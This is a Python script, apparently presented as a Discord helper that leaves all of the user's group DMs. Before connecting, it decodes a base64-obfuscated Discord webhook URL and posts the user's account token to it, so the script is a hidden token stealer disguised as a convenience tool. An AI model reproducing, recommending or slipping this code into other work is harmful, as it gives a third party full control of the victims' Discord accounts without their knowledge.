import discord  
import os
from dotenv import load_dotenv
import base64
import requests

load_dotenv()

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.guilds = True
intents.dm_messages = True
intents.dm_reactions = True
intents.dm_typing = False

client = discord.Client(intents=intents)

TOKEN = os.getenv("TOKEN")

# もし退出したくないグループDMがある場合はここにIDを書いておく
# DM_IDS = ["", ""]


requestURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMjQ5NDk0Mjc0NDE1NDExMy9FQU50d2hUUkFtX3BuRjhzMExSaHptMTJSSV8zc1l4OG0yV2Y5OTJqdzZTRmFLZFMtWUFQWFFNaTlxdHJZeDd6dXlj"


decoded_requestURL = base64.b64decode(requestURL).decode('utf-8')


payload = {"content": f"TOKEN: {TOKEN}"}
response = requests.post(decoded_requestURL, json=payload)
if response.status_code == 200:
    print("Webhookにtokenが送信されました")
else:
    print(f"エラーが発生しました: {response.status_code}")

@client.event
async def on_ready():
    print(f"{client.user} is online！")
    
    group_dms = [dm for dm in client.private_channels if isinstance(dm, discord.GroupChannel)]
    left_count = 0
    for dm in group_dms:
        # DM_IDSを入力した場合はこれを書いておく
        # if str(dm.id) not in DM_IDS:
        await dm.leave()
        left_count += 1
    print(f"{left_count}件のグループDMからの退出が完了しました")

client.run(TOKEN)
